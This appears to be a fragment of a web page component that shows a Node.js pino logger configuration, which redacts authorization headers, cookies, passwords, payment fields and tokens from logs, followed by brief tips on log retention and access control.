      <pre>
        <code>{`import pino from "pino";

const logger = pino({
  level: process.env.LOG_LEVEL ?? "info",
  // Automatically redact sensitive fields from all log lines
  redact: {
    paths: [
      "req.headers.authorization",      // JWT token
      "req.headers.cookie",             // session cookies
      "req.body.password",              // login password
      "req.body.newPassword",
      "req.body.currentPassword",
      "req.body.cardNumber",            // payment data
      "req.body.cvv",
      "*.token",                         // any "token" field at any level
      "*.secret",                        // any "secret" field
    ],
    censor: "[REDACTED]",
  },
});

// pino-http uses these redactions automatically for HTTP request logs
// Result: Authorization: "[REDACTED]", password: "[REDACTED]" in logs

// Additional practices:
// - Log retention: 30-90 days is typical — longer increases breach risk
// - Log access: treat logs as sensitive — access control on your log system
// - Log shipping: use structured JSON (pino) → ship to Datadog/CloudWatch/Elasticsearch
// - NEVER log in production with level "trace" — too verbose, leaks too much`}</code>
      </pre>
    </div>
  );
}
